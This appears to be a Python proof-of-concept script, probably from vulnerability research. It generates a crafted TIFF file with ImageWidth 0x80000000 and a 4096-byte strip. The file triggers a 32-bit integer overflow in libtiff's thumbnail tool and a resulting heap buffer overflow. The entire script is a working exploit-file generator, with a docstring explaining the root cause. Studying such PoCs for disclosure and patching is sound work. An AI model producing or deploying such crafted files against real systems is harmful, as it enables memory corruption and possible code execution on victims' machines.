#!/usr/bin/env python3
"""
PoC generator for VULN 001: Integer Overflow in rastersize Leading to Heap Buffer Overflow
in generateThumbnail() in libtiff/tools/thumbnail.c

Root cause:
  tsize_t rastersize = sh * rowsize;
  where tsize_t is int32 (32-bit signed), sh=uint32, rowsize=tsize_t/int32.

  With bps=1, spp=1, ImageWidth=0x80000000 (2147483648), ImageLength=16:
    rowsize = TIFFScanlineSize(in) = ceil(2147483648/8) = 268435456 (0x10000000)
    sh = 16
    rastersize = 16 * 268435456 = 4294967296 = 0x100000000 -> overflows int32 to 0
    _TIFFmalloc(0) returns non-NULL pointer (tiny allocation)
    TIFFReadEncodedStrip writes StripByteCounts bytes into 0-byte buffer -> heap overflow
"""

import struct
import os

OUTPUT_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.tif")

def make_ifd_entry(tag, type_, count, value):
    """
    Build a 12-byte IFD entry.
    type_: 1=BYTE, 3=SHORT, 4=LONG, 5=RATIONAL
    value: for SHORT/LONG/BYTE that fit in 4 bytes, inline; else offset.
    """
    if type_ == 3:  # SHORT (2 bytes), pack value into first 2 bytes of value field
        return struct.pack('<HHII', tag, type_, count, value & 0xFFFF)
    elif type_ == 4:  # LONG (4 bytes)
        return struct.pack('<HHII', tag, type_, count, value & 0xFFFFFFFF)
    else:
        return struct.pack('<HHII', tag, type_, count, value & 0xFFFFFFFF)

# TIFF layout:
#   Offset 0:    Header (8 bytes)
#   Offset 8:    IFD (2 + N*12 + 4 bytes)
#   After IFD:   Strip data (4096 bytes of dummy content)

HEADER_SIZE = 8
NUM_ENTRIES = 9
IFD_SIZE = 2 + NUM_ENTRIES * 12 + 4  # 2-byte count + entries + 4-byte next-IFD offset

STRIP_DATA_OFFSET = HEADER_SIZE + IFD_SIZE
STRIP_BYTE_COUNT = 4096  # Enough to cause detectable overflow

# IFD entries (must be in ascending tag order per TIFF spec)
# ImageWidth=0x80000000 (2147483648), bps=1, spp=1 causes:
#   rowsize = 268435456, sh=16: rastersize=16*268435456=0 (int32 overflow)
entries = [
    # (tag, type, count, value)
    (0x0100, 4, 1, 0x80000000),  # ImageWidth = 2147483648
    (0x0101, 4, 1, 16),          # ImageLength = 16 (sh=16)
    (0x0102, 3, 1, 1),           # BitsPerSample = 1
    (0x0103, 3, 1, 1),           # Compression = 1 (NONE/uncompressed)
    (0x0106, 3, 1, 1),           # PhotometricInterpretation = 1 (MINISBLACK)
    (0x0111, 4, 1, STRIP_DATA_OFFSET),  # StripOffsets
    (0x0115, 3, 1, 1),           # SamplesPerPixel = 1
    (0x0116, 4, 1, 16),          # RowsPerStrip = 16 (all rows in one strip)
    (0x0117, 4, 1, STRIP_BYTE_COUNT),   # StripByteCounts
]

assert len(entries) == NUM_ENTRIES, f"Entry count mismatch: {len(entries)} != {NUM_ENTRIES}"

# Build TIFF bytes
data = bytearray()

# Header: little-endian magic (0x4949), version (42), offset to first IFD (8)
data += struct.pack('<HHI', 0x4949, 42, HEADER_SIZE)

# IFD
data += struct.pack('<H', NUM_ENTRIES)
for tag, type_, count, value in entries:
    data += make_ifd_entry(tag, type_, count, value)
data += struct.pack('<I', 0)  # Next IFD offset = 0 (no more IFDs)

assert len(data) == STRIP_DATA_OFFSET, \
    f"Strip offset mismatch: {len(data)} != {STRIP_DATA_OFFSET}"

# Strip data: dummy bytes (any content works since we want the overflow during malloc/read)
data += b'\xAB' * STRIP_BYTE_COUNT

with open(OUTPUT_PATH, 'wb') as f:
    f.write(data)

print(f"Generated: {OUTPUT_PATH} ({len(data)} bytes)")
print(f"  ImageWidth = 0x80000000 (2147483648)")
print(f"  ImageLength = 16")
print(f"  BitsPerSample = 1, SamplesPerPixel = 1")
print(f"  Expected rowsize = 268435456 (ceil(2147483648/8))")
print(f"  Expected rastersize = 16 * 268435456 = 4294967296 -> int32 overflow to 0")
print(f"  _TIFFmalloc(0) returns non-NULL; TIFFReadEncodedStrip writes {STRIP_BYTE_COUNT} bytes -> heap overflow")
